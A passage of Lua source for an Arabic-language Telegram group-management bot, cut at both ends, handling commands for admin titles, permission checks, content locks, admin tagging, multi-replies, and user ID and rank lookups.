usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم حذف لقبه من الكروب'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '⊀︰ لايوجد حساب بهذا المعرف ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text == 'لقبي' and tonumber(msg.reply_to_message_id_) == 0 then
Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..msg.sender_user_id_)
GeId = JSON.decode(Ge)
if not GeId.result.custom_title then
send(msg.chat_id_, msg.id_,'⊀︰ وينك وين القب ') 
else
send(msg.chat_id_, msg.id_,'⊀︰ لقبك هو : '..GeId.result.custom_title) 
end
end
if text == "كشف البوت" and Manager(msg) then
local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
local getInfo = JSON.decode(chek)
if getInfo.ok == true then
if getInfo.result.can_change_info == true then
INf = '❴ √ ❵' 
else 
INf = '❴ × ❵' 
end
if getInfo.result.can_delete_messages == true then
DEL = '❴ √ ❵' 
else 
DEL = '❴ × ❵' 
end
if getInfo.result.can_invite_users == true then
INv = '❴ √ ❵' 
else
INv = '❴ × ❵' 
end
if getInfo.result.can_pin_messages == true then
Pin = '❴ √ ❵' 
else
Pin = '❴ × ❵' 
end
if getInfo.result.can_restrict_members == true then
REs = '❴ √ ❵' 
else 
REs = '❴ × ❵' 
end
if getInfo.result.can_promote_members == true then
PRo = '❴ √ ❵'
else
PRo = '❴ × ❵'
end 
send(msg.chat_id_, msg.id_,'\n ⊀︰ صلاحيات البوت هي\n●━━━━𝐑𝐀━━━━●\n⊀︰ علامة ال {√} تعني مفعل\n⊀︰ علامة ال {×} تعني غير مفعل\n●━━━━𝐑𝐀━━━━●\n⊀︰ تغير معلومات المجموعة ↫ '..INf..'\n⊀︰ حذف الرسائل ↫ '..DEL..'\n⊀︰ حظر المستخدمين ↫ '..REs..'\n⊀︰ دعوة المستخدمين ↫ '..INv..'\n⊀︰ ثتبيت الرسالة ↫ '..Pin..'\n⊀︰ اضافة مشرفين ↫ '..PRo)   
end
end
if text == 'تفعيل الحمايه القصوى' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id..'lock:tagrvrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'*⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ تم تفعيل الحمايه القصوى*')
end,nil)   
end
if text == 'تعطيل الحمايه القصوى' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id..'lock:tagrvrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'*⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ تم تعطيل الحمايه القصوى*')
end,nil)   
end
if text == "تعطيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_, '*⊀︰ تم تعطيل الانستا*')
database:set(bot_id.."SourcE_RiNdA:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'*⊀︰ تم تفعيل الانستا*')
database:set(bot_id.."SourcE_RiNdA:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."SourcE_RiNdA:insta_bot"..msg.chat_id_) == "open" then
local Textni = text:match("^معلومات (.*)$")
data,res = https.request('https://forhassan.ml/Black/insta.php?username='..URL.escape(Textni)..'')
if res == 200 then
muaed = json:decode(data)
if muaed.Info == true then
local filee = download_to_file(muaed.ph,msg.sender_user_id_..'.jpg')
sendPhoto(msg.chat_id_, msg.id_,'./'..msg.sender_user_id_..'.jpg',muaed.info)     
os.execute('rm -rf ./'..msg.sender_user_id_..'.jpg') 
end
end
end
if text and text == "تفعيل تاك المشرفين" and Manager(msg) then 
database:set(bot_id.."SourcE_RiNdA:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"⊀︰ تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."SourcE_RiNdA:Tag:Admins:"..msg.chat_id_)
send(msg.chat_id_, msg.id_, "⊀︰ تم تعطيل تاك المشرفين")
end

if text == 'صيح المشرفين' or text == "تاك للمشرفين" or text == "وين المشرفين" or text == "المشرفين" then
if database:get(bot_id.."SourcE_RiNdA:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,b)  
if b.username_ then 
User_id = "@"..b.username_
else
User_id = msg.sender_user_id_
end --الكود حصري سورس ريندا يعني لو بكتهن راح اعرفك انت الـضلـ؏  ذتهن
local t = "\n⊀︰ المستخدم ~ ["..User_id .."] يصيح المشرفين \n●━━━━𝐑𝐀━━━━●\n"
k = 0
for i,v in pairs(data.members_) do
if bot_id ~= v.user_id_ then 
k = k + 1
local username = database:get(bot_id.."user:Name"..v.user_id_)
if database:get(bot_id..'user:Name'..v.user_id_) then
t = t..""..k.." → {[@"..database:get(bot_id..'user:Name'..v.user_id_).."]}\n"
else
t = t..""..k.." → {`"..v.user_id_.."`}\n"
end
end
end
send(msg.chat_id_, msg.id_,t)
end,nil)
end,nil)
end
end
-- عود اخمط وهوبز ع العالم كول تطويري ..

if text == "الساعه" then
local ramsesj20 = "\n الساعه الان : "..os.date("%I:%M%p")
send(msg.chat_id_, msg.id_,ramsesj20)
end

if text == "التاريخ" then
local ramsesj20 =  "\n التاريخ : "..os.date("%Y/%m/%d")
send(msg.chat_id_, msg.id_,ramsesj20)
end
--------------
--- هههه ها فرخ دتبوك ؟ ههههههههههه 
if text == ("الردود المتعدده") and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local list = database:smembers(bot_id.."botss:RiNdA:List:Rd:Sudo")
text = "\nقائمة ردود المتعدده \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
db = "رساله "
text = text..""..k.." => {"..v.."} => {"..db.."}\n"
end
if #list == 0 then
text = "لا توجد ردود متعدده"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text == "اضف رد متعدد" and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."botss:RiNdA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"⊀︰ ارسل الرد الذي اريد اضافته")
end
if text == "حذف رد متعدد" and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."botss:RiNdA:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"⊀︰ ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:RiNdA:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:RiNdA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:RiNdA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:RiNdA:Add:Rd:Sudo:Text"..test, text)  
end  
send(msg.chat_id_, msg.id_,"⊀︰ تم حفظ الرد الاول ارسل الرد الثاني")
return false  
end  
end
if text then  
local test = database:get(bot_id.."botss:RiNdA:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:RiNdA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:RiNdA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:RiNdA:Add:Rd:Sudo:Text1"..test, text)  
end  
send(msg.chat_id_, msg.id_,"⊀︰ تم حفظ الرد الثاني ارسل الرد الثالث")
return false  
end  
end
if text then  
local test = database:get(bot_id.."botss:RiNdA:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:RiNdA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:RiNdA:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:RiNdA:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_,"⊀︰ تم حفظ الرد")
return false  
end  
end
if text then
local Text = database:get(bot_id.."botss:RiNdA:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:RiNdA:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:RiNdA:Add:Rd:Sudo:Text2"..text)   
if Text or Text1 or Text2 then 
local texting = {
Text,
Text1,
Text2
}
Textes = math.random(#texting)
send(msg.chat_id_, msg.id_,texting[Textes])
end
end
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ريندا').." غادر" or text == 'بوت غادر' then  
if Sudo(msg) and not database:get(bot_id..'Left:Bot'..msg.chat_id_)  then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,'* ⊀︰ تم مغادرة الكروب*') 
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
end
return false  
end
if text == 'بوت' then
Namebot = (database:get(bot_id..'Name:Bot') or 'ريندا')
send(msg.chat_id_, msg.id_,'اسمي الكيوت ['..Namebot..'] ')
end
if text == 'الاحصائيات' then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' الاحصائيات ⊀︰ . \n'..' ⊀︰ عدد الكروبات > {'..Groups..'}'..'\n ⊀︰ عدد المشتركين > {'..Users..'}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'الكروبات' then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' ⊀︰ عدد الكروبات > {`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'المشتركين' then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' ⊀︰ عدد المشتركين > {`'..Users..'|}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'تفعيل المغادره' and Devmode(msg) then   
if database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = ' ⊀︰ تم تفعيل مغادرة البوت'
database:del(bot_id..'Left:Bot'..msg.chat_id_)  
else
Text = ' ⊀︰ بالتاكيد تم تفعيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل المغادره' and Devmode(msg) then  
if not database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = ' ⊀︰ تم تعطيل مغادرة البوت'
database:set(bot_id..'Left:Bot'..msg.chat_id_,true)   
else
Text = ' ⊀︰ بالتاكيد تم تعطيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_, Text) 
end

if text == 'تفعيل ردود المدير' and Manager(msg) then   
if database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
Text = ' *⊀︰ تم تفعيل ردود المدير*'
database:del(bot_id..'Reply:Manager'..msg.chat_id_)  
else
Text = ' *⊀︰ تم تفعيل ردود المدير*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل ردود المدير' and Manager(msg) then  
if not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
database:set(bot_id..'Reply:Manager'..msg.chat_id_,true)  
Text = '\n *⊀︰ تم تعطيل ردود المدير*' 
else
Text = '\n *⊀︰ بالتاكيد تم تعطيل ردود المدير*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل ردود المطور' and Manager(msg) then   
if database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
database:del(bot_id..'Reply:Sudo'..msg.chat_id_)  
Text = '\n *⊀︰ تم تفعيل ردود المطور*'
else
Text = '\n *⊀︰ بالتاكيد تم تفعيل ردود المطور*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل ردود المطور' and Manager(msg) then  
if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
database:set(bot_id..'Reply:Sudo'..msg.chat_id_,true)   
Text = '\n *⊀︰ تم تعطيل ردود المطور*' 
else
Text = '\n *⊀︰ بالتاكيد تم تعطيل ردود المطور*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الايدي' and Manager(msg) then   
if database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
database:del(bot_id..'Bot:Id'..msg.chat_id_) 
Text = '\n *⊀︰ تم تفعيل الايدي*' 
else
Text = '\n *⊀︰ بالتاكيد تم تفعيل الايدي*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الايدي' and Manager(msg) then  
if not database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
database:set(bot_id..'Bot:Id'..msg.chat_id_,true) 
Text = '\n *⊀︰ تم تعطيل الايدي*'
else
Text = '\n *⊀︰ بالتاكيد تم تعطيل الايدي*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الايدي بالصوره' and Manager(msg) then   
if database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
database:del(bot_id..'Bot:Id:Photo'..msg.chat_id_) 
Text = '\n *⊀︰ تـم قلـبي تفعـلت صوࢪه بلايدي*' 
else
Text = '\n *⊀︰ متـفعله صوࢪه بلايدي*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الايدي بالصوره' and Manager(msg) then  
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
Text = '\n *⊀︰ تعطـلت صوࢪه بلايدي *'
else
Text = '\n *⊀︰ متعـطله صوره بلايدي*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الحظر' and Constructor(msg) then   
if database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
database:del(bot_id..'Lock:kick'..msg.chat_id_) 
Text = '\n *⊀︰ تـم احظـر براحـتك بـرو*'
else
Text = '\n *⊀︰ والـحمزه متفعل الحظࢪ..🕸️*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الحظر' and Constructor(msg) then  
if not database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
database:set(bot_id..'Lock:kick'..msg.chat_id_,true) 
Text = '\n *⊀︰ بعـد ولا معـيدي يكدر يحظـࢪ..🕸️*' 
else
Text = '\n *⊀︰ بالتاكيد تم تعطيل الحظر*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الارفع' and Constructor(msg) then   
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
database:del(bot_id..'Lock:Add:Bot'..msg.chat_id_) 
Text = '\n *⊀︰ تم تفعيل الارفع*' 
else
Text = '\n *⊀︰ بالتاكيد تم تفعيل الارفع*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الارفع' and Constructor(msg) then  
if not database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
database:set(bot_id..'Lock:Add:Bot'..msg.chat_id_,true) 
Text = '\n* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*' 
else
Text = '\n *⊀︰ بالتاكيد تـم تعطيـل الࢪفـ؏..🕸️*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ايدي' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) or 1) 
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..result.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_) or 0)
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.sender_user_id_) or 0)
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,' ⊀︰ ايـديـه < '..iduser..'\n ⊀︰ مـعࢪفـه < '..username..'\n ⊀︰ ࢪتبـته < '..rtp..'\n ⊀︰ تعـديلاته < '..edit..'\n ⊀︰ نقـاطه < '..NUMPGAME..'\n ⊀︰ جهـاته < '..Contact..'\n ⊀︰ ࢪسائـله < '..Msguser..'')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^ايدي @(.*)$") then
local username = text:match("^ايدي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..result.id_) or 1) 
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..result.id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.id_) or 0)
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.id_) or 0)
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,' ⊀︰ ايديه <('..iduser..')\n ⊀︰ معرفه <('..username..')\n ⊀︰ رتبته <('..rtp..')\n ⊀︰ تعديلاته <('..edit..')\n ⊀︰ نقاطه <('..NUMPGAME..')\n ⊀︰ جهاته <('..Contact..')\n ⊀︰ رسائله <('..Msguser..')')
end,nil)
else
send(msg.chat_id_, msg.id_,'*⊀︰ المعرف غير صحيح* ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == 'رتبتي' then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
send(msg.chat_id_, msg.id_,'* ⊀︰ ࢪتِبتكَ بࢪوِ >* '..rtp)
end
if text == "اسمي"  then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.first_name_  then
first_name = '* ⊀︰ اسـمك الاول يحـلوو..🕸️ >* {`'..(result.first_name_)..'`}'
else
first_name = ''
end   
if result.last_name_ then 
last_name = '* ⊀︰ اسـمك الـثاني يحـلوو..🕸️ >* {`'..result.last_name_..'`}' 
else
last_name = ''
end      
send(msg.chat_id_, msg.id_,first_name..'\n'..last_name) 
end,nil)
end 
if text == 'ايديي' then
send(msg.chat_id_, msg.id_,'* ⊀︰ الايـدي تـبعك..🕸️ >* '..msg.sender_user_id_)
end
if text == 'الرتبه' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'*- ﭑݪعضوٍَ > (*'..username..'*)\n- الرتبه > ('..rtp..')*\n')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
---------
if text and text:match("^الرتبه @(.*)$") then
local username = text:match("^الرتبه @(.*)$")
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,'*- ﭑݪعضوٍَ > (*'..username..'*)\n- الرتبه > ('..rtp..')*\n')
end,nil)
else
send(msg.chat_id_, msg.id_,'*⊀︰ المعرف غير صحيح *')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text == 'كشف' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,' ⊀︰ الايـدي تبـعۿ > ('..iduser..')\n ⊀︰ يـوزࢪ نـيم تبعۿ > ('..username..')\n ⊀︰ رتـبه مالـۿ > ('..rtp..')\n ⊀︰ نوع الكشف > بالرد')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
---------
if text and text:match("^كشف @(.*)$") then
local username = text:match("^كشف @(.*)$")
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,' ⊀︰ لايـدي تبـعۿ > ('..iduser..')\n ⊀︰ يـوزࢪ نـيم تبعۿ > ('..username..')\n ⊀︰ رتـبه مالـۿ > ('..rtp..')\n ⊀︰ نوع الكشف > بالمعرف')
end,nil)
else
send(msg.chat_id_, msg.id_,'*⊀︰ دكـتب المـعرف صـحح..🕸️*')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text==('عدد الكروب') and Mod(msg) then  
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_," ⊀︰ البوت ليس ادمن \n") 
return false  
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
local mode = ' ⊀︰ عدد الادمنيه : '..data.administrator_count_..
'\n\n ⊀︰ عدد الطارديـهم..🍼 : '..data.kicked_count_..
'\n\n ⊀︰ عدد اعضائـك..🍼 : '..data.member_count_..
'\n\n ⊀︰ عدد رسائل الكࢪوبـك..🍼 : '..(msg.id_/2097152/0.5)..
'\n\n ⊀︰ اسـم كروبـك..🍼 : ['..ta.title_..']'
send(msg.chat_id_, msg.id_, mode) 
end,nil)
end,nil)
end 
if text == 'اطردني' or text == 'طردني' then
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
if Can_or_NotCan(msg.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ⊀︰ أسـف ماڪدر اطـردك ( '..Rutba(msg.sender_user_id_,msg.chat_id_)..' )')
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=msg.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'*⊀︰ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها*') 
return false  
end
if (data and data.code_ and data.code_ == 3) then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس ادمن يرجى ترقيتي*') 
return false  
end
if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_, msg.id_,'* ⊀︰ عذرا لا استطيع طرد ادمنية الكروب*') 
return false  
end
if data and data.ID and data.ID == 'Ok' then
send(msg.chat_id_, msg.id_,'* ⊀︰ تم طردك من الكروب*') 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = msg.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
return false
end
end,nil)   
else
send(msg.chat_id_, msg.id_,'* ⊀︰ تم تعطيل امر اطردني*') 
end
end
if text and text:match("^صيح (.*)$") then
local username = text:match("^صيح (.*)$") 
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
function start_function(extra, result, success)
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_,'* ⊀︰ دكـتب معـرف صح..🕸️ *') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
send(msg.chat_id_, msg.id_,'* ⊀︰ لا استطيع اصيح معرف قنوات*') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,'* ⊀︰ لا استطيع اصيح معرف بوتات*') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_, '*⊀︰ لا اسطيع صيح معرفات الكروبات*') 
return false  
end
if result.id_ then
send(msg.chat_id_, msg.id_,' ⊀︰ گـم هيـࢪࢪ بـرو ..🕸️ [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
else
send(msg.chat_id_, msg.id_,'* ⊀︰ تم تعطيل امر صيح*') 
end
return false
end

if text == 'منو ضافني' then
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
send(msg.chat_id_, msg.id_,'* ⊀︰ انـته المـسوي كࢪوب بـرو..🕸️*') 
return false
end
local Added_Me = database:get(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = '*الشخص الـي ضافك بـࢪو..🕸️>*'..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
